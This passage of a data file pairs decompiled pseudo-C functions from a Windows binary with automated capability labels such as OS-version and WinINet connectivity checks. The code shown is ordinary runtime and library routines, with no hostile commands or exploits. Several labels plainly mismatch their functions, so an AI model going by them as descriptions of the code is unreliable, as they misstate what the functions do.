*pcVar12;\n                            if (iVar8 == 0xff) {\n                                *(arg1 + 0xff) = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                iVar9 = 0;\n                                iVar8 = 1;\n                            }\n                            else {\n                                iVar9 = iVar8;\n                                iVar8 = iVar8 + 1;\n                            }\n                            pcVar12 = pcVar12 + 1;\n                            *(arg1 + 0x100) = iVar8;\n                            *(arg1 + iVar9) = cVar2;\n                            *(arg1 + 0x108) = cVar2;\n                        } while (pcVar12 != \"\");\n                        puVar13 = &stack0xffffffffffffffa5 + 3;\n                        sub.msvcrt.dll_sprintf(puVar13, 0x42d8e5, piVar10[4] + 1);\n                        puVar15 = puVar13;\n                        do {\n                            puVar14 = puVar15;\n                            uVar6 = *puVar14 + 0xfefefeff & ~*puVar14;\n                            uVar7 = uVar6 & 0x80808080;\n                            puVar15 = puVar14 + 1;\n                        } while (uVar7 == 0);\n                        bVar16 = (uVar6 & 0x8080) == 0;\n                        if (bVar16) {\n                            uVar7 = uVar7 >> 0x10;\n                        }\n                        if (bVar16) {\n                            puVar15 = puVar14 + 6;\n                        }\n                        puVar11 = puVar15 + ((-3 - CARRY1(uVar7, uVar7)) - puVar13);\n                        if (puVar11 == NULL) {\n                            iVar8 = *(arg1 + 0x100);\n                        }\n                        else {\n                            puVar15 = puVar13 + puVar11;\n                            iVar9 = *(arg1 + 0x100);\n                            do {\n                                uVar1 = *puVar13;\n                                if (iVar9 == 0xff) {\n                                    *(arg1 + 0xff) = 0;\n                                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                    iVar8 = 1;\n                                    iVar9 = 0;\n                                }\n                                else {\n                                    iVar8 = iVar9 + 1;\n                                }\n                                puVar13 = puVar13 + 1;\n                                *(arg1 + 0x100) = iVar8;\n                                *(arg1 + iVar9) = uVar1;\n                                *(arg1 + 0x108) = uVar1;\n                                iVar9 = iVar8;\n                            } while (puVar13 != puVar15);\n                        }\n                        puVar11 = 0x42d8e9;\n                        do {\n                            uVar1 = *puVar11;\n                            if (iVar8 == 0xff) {\n                                *(arg1 + 0xff) = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                iVar9 = 0;\n                                iVar8 = 1;\n                            }\n                            else {\n                                iVar9 = iVar8;\n                                iVar8 = iVar8 + 1;\n                            }\n                            puVar11 = puVar11 + 1;\n                            *(arg1 + 0x100) = iVar8;\n                            *(arg1 + iVar9) = uVar1;\n                            *(arg1 + 0x108) = uVar1;\n                        } while (puVar11 != 0x42d8ec);\n                        do {\n                            piVar10 = *(piVar10 + 2);\n                            iVar5 = *piVar10;\ncode_r0x00408956:\n                        } while (iVar5 - 0x1cU < 5);\n                        fcn.00407f90(arg1, arg2_00, piVar10);\n                        *(arg1 + 0x120) = uVar3;\n                        return;\n                    }\n                    fcn.00407fc0(arg1, arg2_00, piVar10);\n                    *(arg1 + 0x120) = uVar3;\n                }\n            }\n            arg3 = *arg3;\n        } while (arg3 != NULL);\n    }\n    return;\n}\n",
        "token_count": 1995
    },
    "00409420": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00409420(int64_t arg1, ulong arg2, uint32_t *arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    bool bVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    \n    uVar1 = *arg3;\n    bVar3 = true;\n    if (((uVar1 < 2) || (uVar1 == 0x30)) || (uVar1 == 6)) {\n        iVar2 = *(arg1 + 0x130);\n    }\n    else {\n        iVar4 = *(arg1 + 0x100);\n        if (iVar4 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar5 = 1;\n            iVar4 = 0;\n        }\n        else {\n            iVar5 = iVar4 + 1;\n        }\n        *(arg1 + 0x100) = iVar5;\n        *(arg1 + iVar4) = 0x28;\n        bVar3 = false;\n        iVar2 = *(arg1 + 0x130);\n        *(arg1 + 0x108) = 0x28;\n    }\n    if (iVar2 == 0) {\n        fcn.00404790(arg1, arg2, arg3);\n    }\n    if (!bVar3) {\n        iVar4 = *(arg1 + 0x100);\n        if (iVar4 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar5 = 1;\n            iVar4 = 0;\n        }\n        else {\n            iVar5 = iVar4 + 1;\n        }\n        *(arg1 + 0x100) = iVar5;\n        *(arg1 + iVar4) = 0x29;\n        *(arg1 + 0x108) = 0x29;\n        return;\n    }\n    return;\n}\n",
        "token_count": 520
    },
    "00409540": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00409540(uint8_t *arg1, code *arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint8_t *puVar9;\n    uint8_t *puVar10;\n    uint8_t uVar11;\n    bool bVar12;\n    bool bVar13;\n    ulong var_10h_2;\n    ulong var_110h;\n    ulong var_118h;\n    ulong var_120h;\n    ulong var_128h;\n    ulong var_130h;\n    ulong var_138h;\n    ulong var_144h;\n    ulong var_150h;\n    ulong auStack528 [5];\n    uchar auStack488 [8];\n    int64_t iStack480;\n    uint8_t *puStack472;\n    uint8_t *puStack464;\n    uint32_t uStack456;\n    uint8_t *puStack448;\n    uchar *puStack440;\n    uint uStack432;\n    int32_t iStack428;\n    uchar *puStack424;\n    uint uStack416;\n    int32_t iStack412;\n    uint uStack408;\n    ulong uStack400;\n    uint uStack392;\n    uchar auStack376 [256];\n    int64_t iStack120;\n    uchar uStack112;\n    code *pcStack104;\n    ulong var_58h;\n    ulong var_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong s;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_14h;\n    ulong var_8h;\n    \n    uVar11 = *arg1;\n    bVar12 = uVar11 < 0x5f;\n    bVar13 = uVar11 == 0x5f;\n    if (bVar13) {\n        bVar12 = arg1[1] < 0x5a;\n        bVar13 = arg1[1] == 0x5a;\n        uVar8 = 1;\n        if (bVar13) goto code_r0x004095c0;\n    }\n    iVar7 = 8;\n    puVar9 = arg1;\n    puVar10 = \"_GLOBAL_\";\n    do {\n        if (iVar7 == 0) break;\n        iVar7 = iVar7 + -1;\n        bVar12 = *puVar9 < *puVar10;\n        bVar13 = *puVar9 == *puVar10;\n        puVar9 = puVar9 + 1;\n        puVar10 = puVar10 + 1;\n    } while (bVar13);\n    uVar8 = 0;\n    if (((!bVar12 && !bVar13) == bVar12) &&\n       (((uVar1 = arg1[8],  uVar1 == 0x2e || (uVar1 == 0x5f)) || (uVar8 = 0,  uVar1 == 0x24)))) {\n        uVar1 = arg1[9];\n        if (((uVar1 == 0x49) || (uVar8 = 0,  uVar1 == 0x44)) && (uVar8 = 0,  arg1[10] == 0x5f)) {\n            uVar8 = (((uVar1 == 0x49) << 0x1f) >> 0x1f) + 3;\n        }\n    }\ncode_r0x004095c0:\n    auStack528[0] = 0x4095c8;\n    iVar4 = sub.msvcrt.dll_strlen(arg1);\n    puStack464 = arg1 + iVar4;\n    uStack456 = 0x11;\n    iStack412 = iVar4;\n    iStack428 = iStack412 * 2;\n    uStack432 = 0;\n    uStack416 = 0;\n    uStack408 = 0;\n    uStack400 = 0;\n    uStack392 = 0;\n    auStack528[0] = 0x409622;\n    puStack472 = arg1;\n    puStack448 = arg1;\n    iVar7 = fcn.0040b810(iVar4);\n    iVar7 = -iVar7;\n    puStack440 = &stack0xfffffffffffffe18 + iVar7;\n    *(&stack0xfffffffffffffdf0 + iVar7) = 0x40963e;\n    iVar4 = fcn.0040b810(iVar4);\n    iVar4 = -iVar4;\n    puStack424 = &stack0xfffffffffffffe18 + iVar4 + iVar7;\n    if (uVar8 == 1) {\n        iVar6 = 0;\n        if (uVar11 == 0x5f) {\n            uVar11 = arg1[1];\n            puStack448 = arg1 + 1;\n            iVar6 = 0;\n            if (uVar11 == 0x5a) {\n                puStack448 = arg1 + 2;\n                *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x409820;\n                iVar6 = fcn.00403430(&stack0xfffffffffffffe28, 1);\n                if ((uStack456 & 1) == 0) {\n                    uVar11 = *puStack448;\n                }\n                else {\n                    while (uVar11 = *puStack448,  uVar11 == 0x2e) {\n                        uVar11 = puStack448[1];\n                        if (((0x19 < uVar11 + 0x9f) && (uVar11 != 0x5f)) && (9 < uVar11 - 0x30)) {\n                            uVar11 = *puStack448;\n                            break;\n                        }\n                        *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x40984b;\n                        iVar6 = fcn.00401a30(&stack0xfffffffffffffe28, iVar6);\n                    }\n                }\n            }\n        }\n    }\n    else if ((uVar8 == 0) || (3 < uVar8)) {\n        *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x4097c9;\n        iVar6 = fcn.00402960(&stack0xfffffffffffffe28);\n        uVar11 = *puStack448;\n    }\n    else {\n        puVar9 = arg1 + 0xb;\n        puStack448 = puVar9;\n        if ((arg1[0xb] == 0x5f) && (arg1[0xc] == 0x5a)) {\n            puStack448 = arg1 + 0xd;\n            *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x409896;\n            uVar5 = fcn.00403430(&stack0xfffffffffffffe28, 0);\n        }\n        else {\n            *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x40968a;\n            uVar3 = sub.msvcrt.dll_strlen(puVar9);\n            *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x409698;\n            uVar5 = fcn.00401860(&stack0xfffffffffffffe28, puVar9, uVar3);\n        }\n        *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x4096b1;\n        iStack480 = fcn.004017e0(&stack0xfffffffffffffe28, (uVar8 != 2) + 0x42, uVar5, 0);\n        puVar9 = puStack448;\n        *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x4096c1;\n        iVar6 = sub.msvcrt.dll_strlen(puVar9);\n        puStack448 = puVar9 + iVar6;\n        uVar11 = *puStack448;\n        iVar6 = iStack480;\n    }\n    bVar12 = false;\n    if ((uVar11 == 0) && (iVar6 != 0)) {\n        iStack120 = 0;\n        uStack112 = 0;\n        var_50h = 0;\n        var_48h = 0;\n        var_40h._4_4_ = 0;\n        s._0_4_ = 0;\n        pcStack104 = arg2;\n        var_58h = arg3;\n        var_40h._0_4_ = 0;\n        *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x40977b;\n        fcn.00404790(&stack0xfffffffffffffe88, 0x11, iVar6);\n        uVar5 = var_58h;\n        iVar6 = iStack120;\n        (&stack0xfffffffffffffe88)[iStack120] = 0;\n        pcVar2 = pcStack104;\n        *(&stack0xfffffffffffffdf0 + iVar4 + iVar7) = 0x409797;\n        (*pcVar2)(&stack0xfffffffffffffe88, iVar6, uVar5);\n        bVar12 = var_40h == 0;\n    }\n    return bVar12;\n}\n",
        "token_count": 2132
    },
    "004098a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint64_t fcn.004098a0(int64_t arg1, int64_t arg2, uint64_t *arg3, uint *arg4)\n\n{\n    int32_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iStack72;\n    ulong uStack64;\n    uint64_t uStack56;\n    int32_t iStack48;\n    \n    if ((arg1 == 0) || ((arg2 != 0 && (arg3 == NULL)))) {\n        if (arg4 == NULL) {\n            return 0;\n        }\n        *arg4 = 0xfffffffd;\n        return 0;\n    }\n    iStack72 = 0;\n    uStack64 = 0;\n    uStack56 = 0;\n    iStack48 = 0;\n    iVar1 = fcn.00409540(arg1, 0x402170, &iStack72);\n    iVar3 = iStack72;\n    if (iVar1 == 0) {\n        sub.msvcrt.dll_free(iStack72);\n        if (arg4 == NULL) {\n            return 0;\n        }\ncode_r0x0040998b:\n        *arg4 = 0xfffffffe;\n        return 0;\n    }\n    uVar4 = 1;\n    if (iStack48 == 0) {\n        uVar4 = uStack56;\n    }\n    if (iStack72 == 0) {\n        if (arg4 == NULL) {\n            return 0;\n        }\n        if (uVar4 == 1) {\n            *arg4 = 0xffffffff;\n            return 0;\n        }\n        goto code_r0x0040998b;\n    }\n    if (arg2 == 0) {\n        if (arg3 == NULL) goto code_r0x00409964;\n    }\n    else {\n        uVar2 = sub.msvcrt.dll_strlen(iStack72);\n        if (uVar2 < *arg3) {\n            sub.msvcrt.dll_memcpy(arg2, iVar3, uVar2 + 1);\n            sub.msvcrt.dll_free(iVar3);\n            iVar3 = arg2;\n            goto code_r0x00409964;\n        }\n        sub.msvcrt.dll_free(arg2);\n    }\n    *arg3 = uVar4;\ncode_r0x00409964:\n    if (arg4 == NULL) {\n        return iVar3;\n    }\n    *arg4 = 0;\n    return iVar3;\n}\n",
        "token_count": 546
    },
    "0040a440": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.0040a440(ulong param_1, ulong param_2, uint64_t param_3, uchar *param_4)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    uchar *puVar9;\n    char *arg1;\n    uint64_t uVar10;\n    int32_t *piVar11;\n    uint32_t *puVar12;\n    int64_t iVar13;\n    int32_t *piVar14;\n    int32_t iVar15;\n    uint64_t *arg3;\n    ulong auStack160 [5];\n    uchar auStack120 [12];\n    uchar auStack108 [4];\n    uchar *puStack104;\n    ulong uStack80;\n    ulong var_30h;\n    ulong var_18h;\n    \n    if (*0x434350 != 0) {\n        return;\n    }\n    *0x434350 = 1;\n    auStack160[0] = 0x40a47f;\n    fcn.0040adc0();\n    auStack160[0] = 0x40a496;\n    iVar7 = fcn.0040b810(param_1);\n    piVar11 = 0x4300a0;\n    *0x434354 = 0;\n    iVar7 = -iVar7;\n    *0x434358 = &stack0xffffffffffffff88 + iVar7;\n    if ((*0x4300a0 == 0) && (*0x4300a4 == 0)) {\n        param_4 = *0x4300a8;\n        if (*0x4300a8 == 0) {\n            piVar11 = 0x4300ac;\n            param_3 = *0x4300ac;\n            if ((*0x4300ac != 0) || (*0x4300b0 != 0)) goto code_r0x0040a630;\n        }\n        uVar10 = piVar11[2];\n        if (piVar11[2] != 1) {\ncode_r0x0040a74d:\n            *(&stack0xffffffffffffff60 + iVar7) = 0x40a759;\n            fcn.0040a1a0(\"  Unknown pseudo relocation protocol version %d.\\n\", uVar10, param_3, param_4);\n            return;\n        }\n        puVar12 = piVar11 + 3;\n        if (0x4300b7 < puVar12) {\n            *0x434354 = 0;\n            return;\n        }\n        do {\n            uVar1 = *(puVar12 + 2);\n            arg3 = *puVar12 + 0x400000;\n            arg1 = puVar12[1] + 0x400000;\n            uVar10 = *arg3;\n            if (uVar1 == 0x10) {\n                param_4 = *arg1;\n                puVar9 = param_4;\n                if (*arg1 < 0) {\n                    puVar9 = param_4 | 0xffffffffffff0000;\n                }\n                puStack104 = puVar9 + (uVar10 - arg3);\n                *(&stack0xffffffffffffff60 + iVar7) = 0x40a6e1;\n                fcn.0040a210(arg1, &stack0xffffffffffffff98, 2);\n            }\n            else {\n                uVar6 = uVar1;\n                if (uVar1 < 0x11) {\n                    if (uVar6 != 8) {\ncode_r0x0040a6e6:\n                        arg1 = \"  Unknown pseudo relocation bit size %d.\\n\";\n                        uVar10 = uVar6;\n                        puStack104 = NULL;\n                        *(&stack0xffffffffffffff60 + iVar7) = 0x40a6fc;\n                        fcn.0040a1a0(\"  Unknown pseudo relocation bit size %d.\\n\", uVar10, arg3, param_4);\n                        goto code_r0x0040a6fc;\n                    }\n                    param_4 = *arg1;\n                    puVar9 = param_4;\n                    if (*arg1 < '\\0') {\n                        puVar9 = param_4 | 0xffffffffffffff00;\n                    }\n                    puStack104 = puVar9 + (uVar10 - arg3);\n                    *(&stack0xffffffffffffff60 + iVar7) = 0x40a6a7;\n                    fcn.0040a210(arg1, &stack0xffffffffffffff98, 1);\n                }\n                else if (uVar6 == 0x20) {\ncode_r0x0040a6fc:\n                    param_4 = *arg1;\n                    puVar9 = param_4;\n                    if (*arg1 < 0) {\n                        puVar9 = param_4 | 0xffffffff00000000;\n                    }\n                    puStack104 = puVar9 + (uVar10 - arg3);\n                    *(&stack0xffffffffffffff60 + iVar7) = 0x40a72a;\n                    fcn.0040a210(arg1, &stack0xffffffffffffff98, 4);\n                }\n                else {\n                    if (uVar6 != 0x40) goto code_r0x0040a6e6;\n                    puStack104 = (uVar10 - arg3) + *arg1;\n                    *(&stack0xffffffffffffff60 + iVar7) = 0x40a596;\n                    fcn.0040a210(arg1, &stack0xffffffffffffff98, 8);\n                }\n            }\n            puVar12 = puVar12 + 3;\n        } while (puVar12 < 0x4300b8);\n    }\n    else {\ncode_r0x0040a630:\n        if (0x4300b7 < piVar11) {\n            *0x434354 = 0;\n            return;\n        }\n        do {\n            uVar6 = piVar11[1];\n            piVar14 = piVar11 + 2;\n            puStack104 = puStack104 & 0xffffffff00000000 | *(uVar6 + 0x400000) + *piVar11;\n            *(&stack0xffffffffffffff60 + iVar7) = 0x40a664;\n            fcn.0040a210(uVar6 + 0x400000, &stack0xffffffffffffff98, 4);\n            piVar11 = piVar14;\n        } while (piVar14 < 0x4300b8);\n    }\n    pcVar5 = _sym.imp.KERNEL32.dll_VirtualQuery;\n    pcVar4 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    iVar13 = 0;\n    iVar15 = 0;\n    if (0 < *0x434354) {\n        do {\n            if (*(*0x434358 + iVar13) != 0) {\n                uVar3 = *(*0x434358 + iVar13 + 8);\n                *(&stack0xffffffffffffff60 + iVar7) = 0x40a603;\n                iVar8 = (*pcVar5)(uVar3, &stack0xffffffffffffff98, 0x30);\n                uVar3 = uStack80;\n                puVar9 = puStack104;\n                if (iVar8 == 0) {\n                    param_3 = *(*0x434358 + iVar13 + 8);\n                    uVar10 = *(*(*0x434358 + iVar13 + 0x10) + 8);\n                    *(&stack0xffffffffffffff60 + iVar7) = 0x40a74d;\n                    fcn.0040a1a0(\"  VirtualQuery failed for %d bytes at address %p\", uVar10, param_3, param_4);\n                    goto code_r0x0040a74d;\n                }\n                uVar2 = *(*0x434358 + iVar13);\n                *(&stack0xffffffffffffff60 + iVar7) = 0x40a625;\n                param_4 = &stack0xffffffffffffff94;\n                (*pcVar4)(puVar9, uVar3, uVar2);\n            }\n            iVar15 = iVar15 + 1;\n            iVar13 = iVar13 + 0x18;\n        } while (iVar15 < *0x434354);\n    }\n    return;\n}\n",
        "token_count": 1869
    },
    "0040a810": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0040a810(void)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    \n    if (*0x434360 != 0) {\n        return *0x434360;\n    }\n    *0x434360 = 1;\n    uVar4 = *0x415380 & 0xffffffff;\n    if (*0x415380 == -1) {\n        uVar1 = 0;\n        do {\n            uVar4 = uVar1;\n            uVar3 = uVar4 + 1;\n            uVar1 = uVar3;\n        } while (*(uVar3 * 8 + 0x415380) != 0);\n    }\n    uVar3 = uVar4;\n    while (uVar3 != 0) {\n        (**(uVar4 * 8 + 0x415380))();\n        uVar3 = uVar4 - 1;\n        uVar4 = uVar3;\n    }\n    iVar2 = fcn.00409b00(0x40a770);\n    return -(iVar2 == 0);\n}\n",
        "token_count": 257
    },
    "0040ab90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0040ab90(ulong noname_0, ulong arg2)\n\n{\n    if (arg2 != 1) {\n        if (arg2 == 0) {\n            if (*0x434908 != 0) {\n                fcn.0040aa00();\n            }\n            if (*0x434908 == 1) {\n                *0x434908 = 0;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(0x434920);\n            }\n        }\n        else if ((arg2 == 3) && (*0x434908 != 0)) {\n            fcn.0040aa00();\n        }\n        return 1;\n    }\n    if (*0x434908 == 0) {\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x434920);\n    }\n    *0x434908 = 1;\n    return 1;\n}\n",
        "token_count": 194
    },
    "0040b080": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.0040b080(ulong *arg1, ulong arg2, ulong arg3)\n\n{\n    ulong in_RAX;\n    \n    if (arg2 < 3) {\n        arg1[arg2 + 2] = arg3;\n        return in_RAX;\n    }\n    sub.msvcrt.dll_abort();\n    return *arg1;\n}\n",
        "token_count": 77
    },
    "0040b4d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040b4d0(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) != 0) goto code_r0x0040b4e5;\n    fcn.0040b360(arg1);\n    do {\n        sub.msvcrt.dll_abort();\ncode_r0x0040b4e5:\n        fcn.0040b000(arg1);\n    } while( true );\n}\n",
        "token_count": 96
    },
    "0040b9e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.0040b9e0(uint64_t arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    \n    if (*0x4349a8 == NULL) {\n        *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n    }\n    if (**0x4349a8 != 0) {\n        if (*0x4349a8 == NULL) {\n            *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n        }\n        if (**0x4349a8 == 1) {\n            if (*0x4349b0 == NULL) {\n                *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n            }\n            if (*(**0x4349b0 + 8) == arg1) {\n                if (*0x4349b0 == NULL) {\n                    *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                }\n                return ***0x4349b0;\n            }\n        }\n        else {\n            if (*0x4349a8 == NULL) {\n                *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n            }\n            uVar2 = 0;\n            uVar3 = **0x4349a8 - 1;\n            do {\n                uVar1 = uVar2 + uVar3 >> 1;\n                if (*0x4349b0 == NULL) {\n                    *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    if (*(**0x4349b0 + 8 + uVar1 * 0x10) == arg1) goto code_r0x0040bb90;\n                    if (*0x4349b0 == NULL) {\n                        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    }\n                }\n                else if (*(**0x4349b0 + 8 + uVar1 * 0x10) == arg1) {\ncode_r0x0040bb90:\n                    if (*0x4349b0 == NULL) {\n                        *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                    }\n                    return *(**0x4349b0 + uVar1 * 0x10);\n                }\n                if (arg1 < *(**0x4349b0 + 8 + uVar1 * 0x10)) {\n                    if (uVar1 == uVar2) {\n                        return 0;\n                    }\n                    uVar3 = uVar1 - 1;\n                }\n                else {\n                    uVar2 = uVar1 + 1;\n                }\n            } while (uVar2 <= uVar3);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 694
    },
    "0040bf40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t fcn.0040bf40(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t *puVar4;\n    int64_t *piVar5;\n    uint64_t uVar6;\n    \n    if (arg1 == 0) {\n        return 0;\n    }\n    if (*0x4349a8 == NULL) {\n        *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n    }\n    uVar6 = **0x4349a8;\n    if (*0x4349a0 == NULL) {\n        *0x4349a0 = fcn.00410a00(\"idListMax_shmem\", 8, 0);\n    }\n    puVar4 = *0x434998;\n    if (**0x4349a0 <= uVar6) {\n        if (*0x4349a8 == NULL) {\n            *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n        }\n        if (**0x4349a8 == 0) {\n            iVar3 = sub.msvcrt.dll_malloc(0x100);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            if (*0x4349a0 == NULL) {\n                *0x4349a0 = fcn.00410a00(\"idListMax_shmem\", 8, 0);\n            }\n            **0x4349a0 = 0x10;\n            if (*0x4349b0 == NULL) {\n                *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n            }\n            **0x4349b0 = iVar3;\n            puVar4 = *0x434998;\n        }\n        else {\n            if (*0x4349a0 == NULL) {\n                *0x4349a0 = fcn.00410a00(\"idListMax_shmem\", 8, 0);\n            }\n            uVar6 = **0x4349a0;\n            if (*0x4349b0 == NULL) {\n                *0x4349b0 = fcn.00410a00(\"idList_shmem\", 8, 0);\n            }\n            iVar3 = sub.msvcrt.dll_realloc(**0x4349b0, (uVar6 + 0x10) * 0x10);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            if (*0x4349a0 == NULL) {\n                *0x4349a0 = fcn.00410a00(\"idListMax_shmem\", 8, 0);\n            }\n            piVar5 = *0x4349b0;\n            **0x4349a0 = **0x4349a0 + 0x10;\n            if (piVar5 == NULL) {\n                piVar5 = fcn.00410a00(\"idList_shmem\", 8, 0);\n                *0x4349b0 = piVar5;\n            }\n            *piVar5 = iVar3;\n            puVar4 = *0x434998;\n        }\n    }\n    do {\n        do {\n            if (puVar4 == NULL) {\n                puVar4 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n                *0x434998 = puVar4;\n                *puVar4 = *puVar4 + 1;\n                if (puVar4 != NULL) goto code_r0x0040c02d;\n                puVar4 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n                *0x434998 = puVar4;\n                if ((*puVar4 & 0x4000000000000000) != 0) {\n                    if (puVar4 == NULL) {\n                        puVar4 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n                        *0x434998 = puVar4;\n                    }\n                    goto code_r0x0040c170;\n                }\n            }\n            else {\n                *puVar4 = *puVar4 + 1;\ncode_r0x0040c02d:\n                if ((*puVar4 & 0x4000000000000000) != 0) {\ncode_r0x0040c170:\n                    *puVar4 = 1;\n                }\n            }\n            if (puVar4 == NULL) {\n                puVar4 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n                *0x434998 = puVar4;\n            }\n        } while (*puVar4 == 0);\n        if (puVar4 == NULL) {\n            puVar4 = fcn.00410a00(\"idListNextId_shmem\", 8, 0);\n            *0x434998 = puVar4;\n        }\n        iVar3 = fcn.0040b9e0(*puVar4);\n        puVar4 = *0x434998;\n    } while (iVar3 != 0);\n    if (*0x4349a8 == NULL) {\n        *0x4349a8 = fcn.00410a00(\"idListCnt_shmem\", 8, 0);\n    }\n    uVar6 = **0x4349a8;\n    iVar3 = 0;\n    if (uVar6 != 